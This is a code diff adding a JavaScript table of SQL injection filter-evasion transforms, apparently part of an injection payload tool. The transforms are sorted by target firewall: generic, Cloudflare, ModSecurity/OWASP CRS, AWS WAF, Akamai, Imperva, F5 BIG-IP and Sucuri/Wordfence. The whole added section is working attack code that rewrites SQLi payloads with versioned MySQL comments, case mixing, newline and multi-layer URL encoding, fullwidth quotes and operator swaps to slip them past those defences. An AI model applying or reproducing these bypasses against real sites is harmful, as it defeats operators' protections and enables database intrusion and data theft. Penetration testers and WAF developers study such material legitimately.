@@ -278,6 +278,863 @@ const presetCategories = {
 
 
 /**
+ * WAF Bypass Transformations
+ * Jede Transform-Funktion bekommt den aktuellen Payload und gibt den transformierten zurück.
+ * Kann beliebig erweitert werden.
+ */
+const wafBypassTransforms = {
+
+    /* ================================================================
+       GENERIC / UNIVERSAL
+       ================================================================ */
+    "Generic": [
+        // --- Whitespace / Separator ---
+        {
+            name: "Spaces → /**/",
+            desc: "Klassiker: Leerzeichen durch Inline-Comments",
+            transform: (p) => p.replace(/\s+/g, "/**/")
+        },
+        {
+            name: "Spaces → /**//**/",
+            transform: (p) => p.replace(/\s+/g, "/**//**/")
+        },
+        {
+            name: "Spaces → %0a (LF)",
+            transform: (p) => p.replace(/\s+/g, "%0a")
+        },
+        {
+            name: "Spaces → %0d (CR)",
+            transform: (p) => p.replace(/\s+/g, "%0d")
+        },
+        {
+            name: "Spaces → %0d%0a (CRLF)",
+            transform: (p) => p.replace(/\s+/g, "%0d%0a")
+        },
+        {
+            name: "Spaces → %09 (Tab)",
+            transform: (p) => p.replace(/\s+/g, "%09")
+        },
+        {
+            name: "Spaces → %0b (VT)",
+            transform: (p) => p.replace(/\s+/g, "%0b")
+        },
+        {
+            name: "Spaces → %0c (FF)",
+            transform: (p) => p.replace(/\s+/g, "%0c")
+        },
+        {
+            name: "Spaces → %a0 (NBSP)",
+            transform: (p) => p.replace(/\s+/g, "%a0")
+        },
+        {
+            name: "Spaces → /**/%0a/**/",
+            transform: (p) => p.replace(/\s+/g, "/**/%0a/**/")
+        },
+        {
+            name: "Spaces → + (plus)",
+            transform: (p) => p.replace(/\s+/g, "+")
+        },
+
+        // --- Case Manipulation ---
+        {
+            name: "Case Mixing (UnIoN SeLeCt)",
+            transform: (p) => p
+                .replace(/union/gi, "UnIoN")
+                .replace(/select/gi, "SeLeCt")
+                .replace(/and/gi, "AnD")
+                .replace(/or/gi, "oR")
+                .replace(/from/gi, "FrOm")
+                .replace(/where/gi, "WhErE")
+                .replace(/order/gi, "OrDeR")
+                .replace(/by/gi, "bY")
+                .replace(/group/gi, "GrOuP")
+                .replace(/having/gi, "HaViNg")
+                .replace(/limit/gi, "LiMiT")
+                .replace(/sleep/gi, "sLeEp")
+                .replace(/benchmark/gi, "BeNcHmArK")
+                .replace(/waitfor/gi, "wAiTfOr")
+                .replace(/delay/gi, "dElAy")
+                .replace(/information_schema/gi, "InFoRmAtIoN_ScHeMa")
+        },
+        {
+            name: "All Uppercase Keywords",
+            transform: (p) => p
+                .replace(/union/gi, "UNION")
+                .replace(/select/gi, "SELECT")
+                .replace(/and/gi, "AND")
+                .replace(/or/gi, "OR")
+                .replace(/from/gi, "FROM")
+                .replace(/where/gi, "WHERE")
+                .replace(/order/gi, "ORDER")
+                .replace(/group/gi, "GROUP")
+                .replace(/having/gi, "HAVING")
+                .replace(/limit/gi, "LIMIT")
+                .replace(/sleep/gi, "SLEEP")
+        },
+        {
+            name: "All Lowercase Keywords",
+            transform: (p) => p
+                .replace(/union/gi, "union")
+                .replace(/select/gi, "select")
+                .replace(/and/gi, "and")
+                .replace(/or/gi, "or")
+                .replace(/from/gi, "from")
+                .replace(/where/gi, "where")
+                .replace(/order/gi, "order")
+                .replace(/group/gi, "group")
+                .replace(/having/gi, "having")
+                .replace(/limit/gi, "limit")
+                .replace(/sleep/gi, "sleep")
+        },
+
+        // --- Inline / Nested Comments ---
+        {
+            name: "Inline Comments around keywords",
+            transform: (p) => p.replace(
+                /(union|select|and|or|from|where|order|by|group|having|limit|sleep|benchmark|waitfor|delay|information_schema|table_name|column_name)/gi,
+                "/**/$1/**/"
+            )
+        },
+        {
+            name: "Nested Comments /**//**/",
+            transform: (p) => p.replace(
+                /(union|select|and|or|from|where)/gi,
+                "/**//**/$1/**//**/"
+            )
+        },
+{
+    name: "MySQL /*! */ Comments",
+        transform: (p) => p
+            .replace(/union/gi, "/*!UNION*/")
+            .replace(/select/gi, "/*!SELECT*/")
+            .replace(/and/gi, "/*!AND*/")
+            .replace(/or/gi, "/*!OR*/")
+            .replace(/from/gi, "/*!FROM*/")
+            .replace(/where/gi, "/*!WHERE*/")
+            .replace(/order/gi, "/*!ORDER*/")
+            .replace(/by/gi, "/*!BY*/")
+            .replace(/sleep/gi, "/*!SLEEP*/")
+},
+{
+    name: "MySQL Versioned /*!50000*/",
+        transform: (p) => p
+            .replace(/union/gi, "/*!50000UNION*/")
+            .replace(/select/gi, "/*!50000SELECT*/")
+            .replace(/and/gi, "/*!50000AND*/")
+            .replace(/or/gi, "/*!50000OR*/")
+            .replace(/from/gi, "/*!50000FROM*/")
+            .replace(/where/gi, "/*!50000WHERE*/")
+            .replace(/order/gi, "/*!50000ORDER*/")
+            .replace(/by/gi, "/*!50000BY*/")
+            .replace(/group/gi, "/*!50000GROUP*/")
+            .replace(/having/gi, "/*!50000HAVING*/")
+            .replace(/limit/gi, "/*!50000LIMIT*/")
+            .replace(/sleep/gi, "/*!50000SLEEP*/")
+            .replace(/benchmark/gi, "/*!50000BENCHMARK*/")
+},
+{
+    name: "MySQL /*!12345*/ (älter)",
+        transform: (p) => p
+            .replace(/union/gi, "/*!12345UNION*/")
+            .replace(/select/gi, "/*!12345SELECT*/")
+            .replace(/and/gi, "/*!12345AND*/")
+            .replace(/or/gi, "/*!12345OR*/")
+},
+
+// --- Encoding ---
+{
+    name: "URL Encode (full)",
+        transform: (p) => encodeURIComponent(p)
+},
+{
+    name: "Double URL Encode",
+        transform: (p) => encodeURIComponent(encodeURIComponent(p))
+},
+{
+    name: "Triple URL Encode",
+        transform: (p) => encodeURIComponent(encodeURIComponent(encodeURIComponent(p)))
+},
+{
+    name: "URL Encode selective (SQLi chars)",
+        transform: (p) => p
+            .replace(/ /g, "%20")
+            .replace(/'/g, "%27")
+            .replace(/"/g, "%22")
+            .replace(/=/g, "%3D")
+            .replace(/#/g, "%23")
+            .replace(/\(/g, "%28")
+            .replace(/\)/g, "%29")
+            .replace(/;/g, "%3B")
+            .replace(/--/g, "%2D%2D")
+},
+{
+    name: "Double Encode only quotes & spaces",
+        transform: (p) => p
+            .replace(/ /g, "%2520")
+            .replace(/'/g, "%2527")
+            .replace(/"/g, "%2522")
+            .replace(/=/g, "%253D")
+},
+{
+    name: "Unicode %uXXXX (quotes)",
+        transform: (p) => p
+            .replace(/'/g, "%u0027")
+            .replace(/"/g, "%u0022")
+            .replace(/ /g, "%u0020")
+},
+{
+    name: "Unicode %u + Case Mix",
+        transform: (p) => p
+            .replace(/'/g, "%u0027")
+            .replace(/union/gi, "UnIoN")
+            .replace(/select/gi, "SeLeCt")
+            .replace(/\s+/g, "/**/")
+},
+{
+    name: "Hex 0x27 for quotes",
+        transform: (p) => p.replace(/'/g, "0x27")
+},
+{
+    name: "CHAR() style hint (quotes → CHAR)",
+        transform: (p) => p.replace(/'/g, "CHAR(39)")
+},
+
+// --- Operator Alternatives ---
+{
+    name: "|| und && statt OR/AND",
+        transform: (p) => p
+            .replace(/\bOR\b/gi, "||")
+            .replace(/\bAND\b/gi, "&&")
+},
+{
+    name: "LIKE statt =",
+        transform: (p) => p
+            .replace(/1\s*=\s*1/gi, "1 LIKE 1")
+            .replace(/1\s*=\s*2/gi, "1 LIKE 2")
+            .replace(/'1'\s*=\s*'1'/gi, "'1' LIKE '1'")
+            .replace(/'1'\s*=\s*'2'/gi, "'1' LIKE '2'")
+},
+{
+    name: "RLIKE / REGEXP statt =",
+        transform: (p) => p
+            .replace(/1\s*=\s*1/gi, "1 RLIKE 1")
+            .replace(/1\s*=\s*2/gi, "1 RLIKE 2")
+            .replace(/'1'\s*=\s*'1'/gi, "'1' REGEXP '1'")
+},
+{
+    name: "BETWEEN statt =",
+        transform: (p) => p
+            .replace(/1\s*=\s*1/gi, "1 BETWEEN 0 AND 1")
+            .replace(/1\s*=\s*2/gi, "1 BETWEEN 2 AND 3")
+},
+{
+    name: "IS NOT NULL / IS NULL Tricks",
+        transform: (p) => p
+            .replace(/1\s*=\s*1/gi, "1 IS NOT NULL")
+            .replace(/1\s*=\s*2/gi, "1 IS NULL")
+},
+{
+    name: "Null-safe <=> Operator",
+        transform: (p) => p.replace(/=\s*/g, "<=>")
+},
+{
+    name: "Scientific notation (1e0)",
+        transform: (p) => p
+            .replace(/\b1\s*=\s*1\b/gi, "1e0=1e0")
+            .replace(/\b1\s*=\s*2\b/gi, "1e0=2e0")
+            .replace(/\b0\s*=\s*0\b/gi, "0e0=0e0")
+},
+{
+    name: "IN / NOT IN",
+        transform: (p) => p
+            .replace(/1\s*=\s*1/gi, "1 IN (1)")
+            .replace(/1\s*=\s*2/gi, "1 NOT IN (1)")
+},
+{
+    name: "MOD / DIV / XOR",
+        transform: (p) => p
+            .replace(/1\s*=\s*1/gi, "MOD(1,1)=1")
+            .replace(/1\s*=\s*2/gi, "MOD(1,2)=1")
+            .replace(/1\s*=\s*1/gi, "1 DIV 1")
+            .replace(/1\s*=\s*1/gi, "1 XOR 0")
+},
+
+// --- Combined strong generics ---
+{
+    name: "Strong: Comments + Case + Newline",
+        transform: (p) => p
+            .replace(/\s+/g, "%0a")
+            .replace(/union/gi, "/*!UNION*/")
+            .replace(/select/gi, "/*!SELECT*/")
+            .replace(/and/gi, "/*!AND*/")
+            .replace(/or/gi, "/*!OR*/")
+},
+{
+    name: "Strong: Double Encode + Comments",
+        transform: (p) => encodeURIComponent(encodeURIComponent(
+            p.replace(/\s+/g, "/**/")
+                .replace(/union/gi, "/*!UNION*/")
+                .replace(/select/gi, "/*!SELECT*/")
+        ))
+},
+{
+    name: "Strong: Versioned + Case + /**/",
+        transform: (p) => p
+            .replace(/\s+/g, "/**/")
+            .replace(/union/gi, "/*!50000UnIoN*/")
+            .replace(/select/gi, "/*!50000SeLeCt*/")
+            .replace(/and/gi, "/*!50000AnD*/")
+            .replace(/or/gi, "/*!50000oR*/")
+}
+    ],
+
+/* ================================================================
+   CLOUDFLARE
+   ================================================================ */
+"Cloudflare": [
+    {
+        name: "/*!50000*/ Versioned (sehr stark)",
+        desc: "Eine der zuverlässigsten CF-Bypass-Techniken",
+        transform: (p) => p
+            .replace(/union/gi, "/*!50000UNION*/")
+            .replace(/select/gi, "/*!50000SELECT*/")
+            .replace(/and/gi, "/*!50000AND*/")
+            .replace(/or/gi, "/*!50000OR*/")
+            .replace(/from/gi, "/*!50000FROM*/")
+            .replace(/where/gi, "/*!50000WHERE*/")
+            .replace(/order/gi, "/*!50000ORDER*/")
+            .replace(/by/gi, "/*!50000BY*/")
+            .replace(/group/gi, "/*!50000GROUP*/")
+            .replace(/having/gi, "/*!50000HAVING*/")
+            .replace(/limit/gi, "/*!50000LIMIT*/")
+            .replace(/sleep/gi, "/*!50000SLEEP*/")
+            .replace(/benchmark/gi, "/*!50000BENCHMARK*/")
+            .replace(/information_schema/gi, "/*!50000INFORMATION_SCHEMA*/")
+    },
+    {
+        name: "/*!12345*/ + Case Mix",
+        transform: (p) => p
+            .replace(/union/gi, "/*!12345UnIoN*/")
+            .replace(/select/gi, "/*!12345SeLeCt*/")
+            .replace(/and/gi, "/*!12345AnD*/")
+            .replace(/or/gi, "/*!12345oR*/")
+            .replace(/\s+/g, "/**/")
+    },
+    {
+        name: "Newline %0a + Case",
+        transform: (p) => p
+            .replace(/\s+/g, "%0a")
+            .replace(/union/gi, "UnIoN")
+            .replace(/select/gi, "SeLeCt")
+            .replace(/and/gi, "AnD")
+            .replace(/or/gi, "oR")
+            .replace(/from/gi, "FrOm")
+            .replace(/where/gi, "WhErE")
+    },
+    {
+        name: "CRLF %0d%0a + Versioned",
+        transform: (p) => p
+            .replace(/\s+/g, "%0d%0a")
+            .replace(/union/gi, "/*!50000UNION*/")
+            .replace(/select/gi, "/*!50000SELECT*/")
+    },
+    {
+        name: "Comment + Double Encode",
+        transform: (p) => encodeURIComponent(
+            p.replace(/\s+/g, "/**/")
+                .replace(/union/gi, "/*!UNION*/")
+                .replace(/select/gi, "/*!SELECT*/")
+                .replace(/and/gi, "/*!AND*/")
+                .replace(/or/gi, "/*!OR*/")
+        )
+    },
+    {
+        name: "Scientific 1e0 + Comments",
+        transform: (p) => p
+            .replace(/\b1\s*=\s*1\b/gi, "1e0=1e0")
+            .replace(/\b1\s*=\s*2\b/gi, "1e0=2e0")
+            .replace(/\s+/g, "/**/")
+    },
+    {
+        name: "|| / && + Versioned Comments",
+        transform: (p) => p
+            .replace(/\bOR\b/gi, "||")
+            .replace(/\bAND\b/gi, "&&")
+            .replace(/union/gi, "/*!50000UNION*/")
+            .replace(/select/gi, "/*!50000SELECT*/")
+    },
+    {
+        name: "Nested Comments + %0a",
+        transform: (p) => p
+            .replace(/\s+/g, "/**/%0a/**/")
+            .replace(/union/gi, "/*!UNION*/")
+            .replace(/select/gi, "/*!SELECT*/")
+    },
+    {
+        name: "Fullwidth + Versioned",
+        transform: (p) => p
+            .replace(/'/g, "＇")
+            .replace(/union/gi, "/*!50000UNION*/")
+            .replace(/select/gi, "/*!50000SELECT*/")
+            .replace(/\s+/g, "/**/")
+    },
+    {
+        name: "Strong CF Combo (Versioned + Case + %0a)",
+        transform: (p) => p
+            .replace(/\s+/g, "%0a")
+            .replace(/union/gi, "/*!50000UnIoN*/")
+            .replace(/select/gi, "/*!50000SeLeCt*/")
+            .replace(/and/gi, "/*!50000AnD*/")
+            .replace(/or/gi, "/*!50000oR*/")
+            .replace(/from/gi, "/*!50000FrOm*/")
+            .replace(/where/gi, "/*!50000WhErE*/")
+    },
+    {
+        name: "CF – Inline /*! */ around everything",
+        transform: (p) => p.replace(
+            /(union|select|and|or|from|where|order|by|group|limit|sleep)/gi,
+            "/*!$1*/"
+        )
+    }
+],
+
+    /* ================================================================
+       MODSECURITY / OWASP CRS
+       ================================================================ */
+    "ModSecurity / OWASP CRS": [
+        {
+            name: "Nested /**/ + Case Mixing",
+            transform: (p) => p
+                .replace(/\s+/g, "/**/")
+                .replace(/union/gi, "uNiOn")
+                .replace(/select/gi, "sElEcT")
+                .replace(/and/gi, "aNd")
+                .replace(/or/gi, "oR")
+                .replace(/from/gi, "fRoM")
+                .replace(/where/gi, "wHeRe")
+        },
+        {
+            name: "/*! */ MySQL style",
+            transform: (p) => p
+                .replace(/union/gi, "/*!UNION*/")
+                .replace(/select/gi, "/*!SELECT*/")
+                .replace(/and/gi, "/*!AND*/")
+                .replace(/or/gi, "/*!OR*/")
+                .replace(/from/gi, "/*!FROM*/")
+                .replace(/where/gi, "/*!WHERE*/")
+                .replace(/order/gi, "/*!ORDER*/")
+                .replace(/by/gi, "/*!BY*/")
+                .replace(/sleep/gi, "/*!SLEEP*/")
+        },
+        {
+            name: "/*!50000*/ Versioned",
+            transform: (p) => p
+                .replace(/union/gi, "/*!50000UNION*/")
+                .replace(/select/gi, "/*!50000SELECT*/")
+                .replace(/and/gi, "/*!50000AND*/")
+                .replace(/or/gi, "/*!50000OR*/")
+                .replace(/from/gi, "/*!50000FROM*/")
+                .replace(/where/gi, "/*!50000WHERE*/")
+                .replace(/sleep/gi, "/*!50000SLEEP*/")
+        },
+        {
+            name: "LIKE / RLIKE / REGEXP",
+            transform: (p) => p
+                .replace(/1\s*=\s*1/gi, "1 LIKE 1")
+                .replace(/1\s*=\s*2/gi, "1 LIKE 2")
+                .replace(/'1'\s*=\s*'1'/gi, "'1' LIKE '1'")
+                .replace(/'1'\s*=\s*'2'/gi, "'1' REGEXP '2'")
+                .replace(/1\s*=\s*1/gi, "1 RLIKE '1'")
+        },
+        {
+            name: "BETWEEN / NOT BETWEEN",
+            transform: (p) => p
+                .replace(/1\s*=\s*1/gi, "1 BETWEEN 0 AND 1")
+                .replace(/1\s*=\s*2/gi, "1 NOT BETWEEN 0 AND 1")
+        },
+        {
+            name: "Null-safe <=> + Comments",
+            transform: (p) => p
+                .replace(/=\s*/g, "<=>")
+                .replace(/\s+/g, "/**/")
+        },
+        {
+            name: "%0a + Inline Comments",
+            transform: (p) => p.replace(/\s+/g, "/**/%0a/**/")
+        },
+        {
+            name: "Multi-level nested comments",
+            transform: (p) => p
+                .replace(/\s+/g, "/**//**/")
+                .replace(/union/gi, "/*!UNION*/")
+                .replace(/select/gi, "/*!SELECT*/")
+        },
+        {
+            name: "SOUNDS LIKE / RLIKE Tricks",
+            transform: (p) => p
+                .replace(/1\s*=\s*1/gi, "'a' SOUNDS LIKE 'a'")
+                .replace(/1\s*=\s*2/gi, "'a' SOUNDS LIKE 'b'")
+        },
+        {
+            name: "IN (SELECT) Style",
+            transform: (p) => p
+                .replace(/1\s*=\s*1/gi, "1 IN (SELECT 1)")
+                .replace(/1\s*=\s*2/gi, "1 IN (SELECT 0)")
+        },
+        {
+            name: "Strong CRS: Versioned + Case + %0a",
+            transform: (p) => p
+                .replace(/\s+/g, "%0a")
+                .replace(/union/gi, "/*!50000uNiOn*/")
+                .replace(/select/gi, "/*!50000sElEcT*/")
+                .replace(/and/gi, "/*!50000aNd*/")
+                .replace(/or/gi, "/*!50000oR*/")
+        },
+        {
+            name: "CRS – Comment everything + LIKE",
+            transform: (p) => p
+                .replace(/\s+/g, "/**/")
+                .replace(/1\s*=\s*1/gi, "1/**/LIKE/**/1")
+                .replace(/1\s*=\s*2/gi, "1/**/LIKE/**/2")
+                .replace(/union/gi, "/*!UNION*/")
+                .replace(/select/gi, "/*!SELECT*/")
+        }
+    ],
+
+        /* ================================================================
+           AWS WAF
+           ================================================================ */
+        "AWS WAF": [
+            {
+                name: "Comment Injection + Case",
+                transform: (p) => p
+                    .replace(/\s+/g, "/**/")
+                    .replace(/union/gi, "UnIoN/**/")
+                    .replace(/select/gi, "SeLeCt/**/")
+                    .replace(/and/gi, "AnD/**/")
+                    .replace(/or/gi, "oR/**/")
+                    .replace(/from/gi, "FrOm/**/")
+                    .replace(/where/gi, "WhErE/**/")
+            },
+            {
+                name: "URL Encode + Comments",
+                transform: (p) => encodeURIComponent(p.replace(/\s+/g, "/**/"))
+            },
+            {
+                name: "Double Encode + Case Mix",
+                transform: (p) => encodeURIComponent(encodeURIComponent(
+                    p.replace(/union/gi, "UnIoN")
+                        .replace(/select/gi, "SeLeCt")
+                        .replace(/and/gi, "AnD")
+                        .replace(/or/gi, "oR")
+                        .replace(/\s+/g, "/**/")
+                ))
+            },
+            {
+                name: "/*!50000*/ + Newline",
+                transform: (p) => p
+                    .replace(/union/gi, "/*!50000UNION*/")
+                    .replace(/select/gi, "/*!50000SELECT*/")
+                    .replace(/and/gi, "/*!50000AND*/")
+                    .replace(/or/gi, "/*!50000OR*/")
+                    .replace(/\s+/g, "%0a")
+            },
+            {
+                name: "Versioned + Double Encode",
+                transform: (p) => encodeURIComponent(
+                    p.replace(/union/gi, "/*!50000UNION*/")
+                        .replace(/select/gi, "/*!50000SELECT*/")
+                        .replace(/\s+/g, "/**/")
+                )
+            },
+            {
+                name: "Scientific + Comments",
+                transform: (p) => p
+                    .replace(/\b1\s*=\s*1\b/gi, "1e0=1e0")
+                    .replace(/\b1\s*=\s*2\b/gi, "1e0=2e0")
+                    .replace(/\s+/g, "/**/")
+                    .replace(/union/gi, "/*!UNION*/")
+                    .replace(/select/gi, "/*!SELECT*/")
+            },
+            {
+                name: "|| / && + Comments + Case",
+                transform: (p) => p
+                    .replace(/\bOR\b/gi, "||")
+                    .replace(/\bAND\b/gi, "&&")
+                    .replace(/\s+/g, "/**/")
+                    .replace(/union/gi, "UnIoN")
+                    .replace(/select/gi, "SeLeCt")
+            },
+            {
+                name: "Strong AWS Combo",
+                transform: (p) => encodeURIComponent(
+                    p.replace(/\s+/g, "/**/%0a/**/")
+                        .replace(/union/gi, "/*!50000UnIoN*/")
+                        .replace(/select/gi, "/*!50000SeLeCt*/")
+                        .replace(/and/gi, "/*!50000AnD*/")
+                        .replace(/or/gi, "/*!50000oR*/")
+                )
+            },
+            {
+                name: "AWS – Multiline + Versioned",
+                transform: (p) => p
+                    .replace(/\s+/g, "%0a")
+                    .replace(/union/gi, "/*!50000UNION*/")
+                    .replace(/select/gi, "/*!50000SELECT*/")
+                    .replace(/from/gi, "/*!50000FROM*/")
+                    .replace(/where/gi, "/*!50000WHERE*/")
+            }
+        ],
+
+            /* ================================================================
+               AKAMAI
+               ================================================================ */
+            "Akamai": [
+                {
+                    name: "Fullwidth Quote + Comments",
+                    transform: (p) => p
+                        .replace(/'/g, "＇")
+                        .replace(/\s+/g, "/**/")
+                },
+                {
+                    name: "Fullwidth + Case Mix",
+                    transform: (p) => p
+                        .replace(/'/g, "＇")
+                        .replace(/union/gi, "UnIoN")
+                        .replace(/select/gi, "SeLeCt")
+                        .replace(/and/gi, "AnD")
+                        .replace(/or/gi, "oR")
+                        .replace(/\s+/g, "/**/")
+                },
+                {
+                    name: "Unicode %u0027 + Case",
+                    transform: (p) => p
+                        .replace(/'/g, "%u0027")
+                        .replace(/"/g, "%u0022")
+                        .replace(/union/gi, "UnIoN")
+                        .replace(/select/gi, "SeLeCt")
+                        .replace(/\s+/g, "/**/")
+                },
+                {
+                    name: "Multi-level Comments",
+                    transform: (p) => p
+                        .replace(/\s+/g, "/**//**/")
+                        .replace(/union/gi, "/*!UNION*/")
+                        .replace(/select/gi, "/*!SELECT*/")
+                        .replace(/and/gi, "/*!AND*/")
+                        .replace(/or/gi, "/*!OR*/")
+                },
+                {
+                    name: "Versioned + Fullwidth",
+                    transform: (p) => p
+                        .replace(/'/g, "＇")
+                        .replace(/union/gi, "/*!50000UNION*/")
+                        .replace(/select/gi, "/*!50000SELECT*/")
+                        .replace(/\s+/g, "/**/")
+                },
+                {
+                    name: "%0a + Unicode + Case",
+                    transform: (p) => p
+                        .replace(/'/g, "%u0027")
+                        .replace(/\s+/g, "%0a")
+                        .replace(/union/gi, "UnIoN")
+                        .replace(/select/gi, "SeLeCt")
+                },
+                {
+                    name: "Akamai Strong Combo",
+                    transform: (p) => p
+                        .replace(/'/g, "＇")
+                        .replace(/\s+/g, "/**/%0a/**/")
+                        .replace(/union/gi, "/*!50000UnIoN*/")
+                        .replace(/select/gi, "/*!50000SeLeCt*/")
+                        .replace(/and/gi, "/*!50000AnD*/")
+                        .replace(/or/gi, "/*!50000oR*/")
+                },
+                {
+                    name: "Overlong UTF-8 style (basic)",
+                    transform: (p) => p
+                        .replace(/'/g, "%c0%a7")		// overlong single quote approximation
+                        .replace(/\s+/g, "/**/")
+                }
+            ],
+
+                /* ================================================================
+                   IMPERVA / INCAPSULA
+                   ================================================================ */
+                "Imperva / Incapsula": [
+                    {
+                        name: "/*!50000UNION SELECT*/ classic",
+                        transform: (p) => p
+                            .replace(/union\s+select/gi, "/*!50000UNION SELECT*/")
+                            .replace(/union/gi, "/*!50000UNION*/")
+                            .replace(/select/gi, "/*!50000SELECT*/")
+                            .replace(/and/gi, "/*!50000AND*/")
+                            .replace(/or/gi, "/*!50000OR*/")
+                            .replace(/from/gi, "/*!50000FROM*/")
+                            .replace(/where/gi, "/*!50000WHERE*/")
+                    },
+                    {
+                        name: "Multi-Comment + Newline",
+                        transform: (p) => p.replace(/\s+/g, "/**/%0a/**/")
+                    },
+                    {
+                        name: "Case + Inline + Newline",
+                        transform: (p) => p
+                            .replace(/\s+/g, "%0a")
+                            .replace(/union/gi, "uNiOn")
+                            .replace(/select/gi, "sElEcT")
+                            .replace(/and/gi, "aNd")
+                            .replace(/or/gi, "oR")
+                    },
+                    {
+                        name: "Nested /*! */ + Case",
+                        transform: (p) => p
+                            .replace(/union/gi, "/*!uNiOn*/")
+                            .replace(/select/gi, "/*!sElEcT*/")
+                            .replace(/and/gi, "/*!aNd*/")
+                            .replace(/or/gi, "/*!oR*/")
+                            .replace(/\s+/g, "/**/")
+                    },
+                    {
+                        name: "Double Encode + Versioned",
+                        transform: (p) => encodeURIComponent(encodeURIComponent(
+                            p.replace(/union/gi, "/*!50000UNION*/")
+                                .replace(/select/gi, "/*!50000SELECT*/")
+                                .replace(/\s+/g, "/**/")
+                        ))
+                    },
+                    {
+                        name: "Imperva Strong (Versioned + %0a + Case)",
+                        transform: (p) => p
+                            .replace(/\s+/g, "%0a")
+                            .replace(/union/gi, "/*!50000UnIoN*/")
+                            .replace(/select/gi, "/*!50000SeLeCt*/")
+                            .replace(/and/gi, "/*!50000AnD*/")
+                            .replace(/or/gi, "/*!50000oR*/")
+                            .replace(/from/gi, "/*!50000FrOm*/")
+                    },
+                    {
+                        name: "Comment density extreme",
+                        transform: (p) => p
+                            .replace(/\s+/g, "/**//**//**/")
+                            .replace(/union/gi, "/*!UNION*/")
+                            .replace(/select/gi, "/*!SELECT*/")
+                    }
+                ],
+
+                    /* ================================================================
+                       F5 BIG-IP ASM
+                       ================================================================ */
+                    "F5 BIG-IP": [
+                        {
+                            name: "Heavy Inline Comments",
+                            transform: (p) => p
+                                .replace(/\s+/g, "/**/")
+                                .replace(/union/gi, "/*!UNION*/")
+                                .replace(/select/gi, "/*!SELECT*/")
+                                .replace(/and/gi, "/*!AND*/")
+                                .replace(/or/gi, "/*!OR*/")
+                        },
+                        {
+                            name: "Hex Quote (0x27) + Comments",
+                            transform: (p) => p
+                                .replace(/'/g, "0x27")
+                                .replace(/\s+/g, "/**/")
+                        },
+                        {
+                            name: "CHAR(39) + Comments",
+                            transform: (p) => p
+                                .replace(/'/g, "CHAR(39)")
+                                .replace(/\s+/g, "/**/")
+                        },
+                        {
+                            name: "Case Mixing + /**/",
+                            transform: (p) => p
+                                .replace(/\s+/g, "/**/")
+                                .replace(/union/gi, "UnIoN")
+                                .replace(/select/gi, "SeLeCt")
+                                .replace(/and/gi, "AnD")
+                                .replace(/or/gi, "oR")
+                                .replace(/from/gi, "FrOm")
+                                .replace(/where/gi, "WhErE")
+                        },
+                        {
+                            name: "Versioned /*!50000*/ + Case",
+                            transform: (p) => p
+                                .replace(/union/gi, "/*!50000UnIoN*/")
+                                .replace(/select/gi, "/*!50000SeLeCt*/")
+                                .replace(/and/gi, "/*!50000AnD*/")
+                                .replace(/or/gi, "/*!50000oR*/")
+                                .replace(/\s+/g, "/**/")
+                        },
+                        {
+                            name: "Newline + Hex + Comments",
+                            transform: (p) => p
+                                .replace(/'/g, "0x27")
+                                .replace(/\s+/g, "%0a")
+                                .replace(/union/gi, "/*!UNION*/")
+                                .replace(/select/gi, "/*!SELECT*/")
+                        },
+                        {
+                            name: "F5 Strong Combo",
+                            transform: (p) => p
+                                .replace(/'/g, "CHAR(39)")
+                                .replace(/\s+/g, "/**/%0a/**/")
+                                .replace(/union/gi, "/*!50000UNION*/")
+                                .replace(/select/gi, "/*!50000SELECT*/")
+                                .replace(/and/gi, "/*!50000AND*/")
+                                .replace(/or/gi, "/*!50000OR*/")
+                        },
+                        {
+                            name: "CONCAT / CHAR friendly",
+                            transform: (p) => p
+                                .replace(/\s+/g, "/**/")
+                                .replace(/union/gi, "UnIoN")
+                                .replace(/select/gi, "SeLeCt")
+                                .replace(/'/g, "CHAR(39)")
+                        }
+                    ],
+
+                        /* ================================================================
+                           EXTRA: Sucuri / Wordfence / Generic PHP-WAFs
+                           ================================================================ */
+                        "Sucuri / Wordfence": [
+                            {
+                                name: "Versioned + Case + Comments",
+                                transform: (p) => p
+                                    .replace(/\s+/g, "/**/")
+                                    .replace(/union/gi, "/*!50000UnIoN*/")
+                                    .replace(/select/gi, "/*!50000SeLeCt*/")
+                                    .replace(/and/gi, "/*!50000AnD*/")
+                                    .replace(/or/gi, "/*!50000oR*/")
+                            },
+                            {
+                                name: "Double Encode + Newline",
+                                transform: (p) => encodeURIComponent(encodeURIComponent(
+                                    p.replace(/\s+/g, "%0a")
+                                ))
+                            },
+                            {
+                                name: "Fullwidth + Comments",
+                                transform: (p) => p
+                                    .replace(/'/g, "＇")
+                                    .replace(/\s+/g, "/**/")
+                                    .replace(/union/gi, "/*!UNION*/")
+                                    .replace(/select/gi, "/*!SELECT*/")
+                            },
+                            {
+                                name: "LIKE + Comments + Case",
+                                transform: (p) => p
+                                    .replace(/1\s*=\s*1/gi, "1/**/LIKE/**/1")
+                                    .replace(/1\s*=\s*2/gi, "1/**/LIKE/**/2")
+                                    .replace(/\s+/g, "/**/")
+                                    .replace(/union/gi, "UnIoN")
+                                    .replace(/select/gi, "SeLeCt")
+                            }
+                        ]
+};
+
+/**
  * Dynamic UNION / ORDER BY payload generator
  */
 function buildUnionPayload(type, columns) {
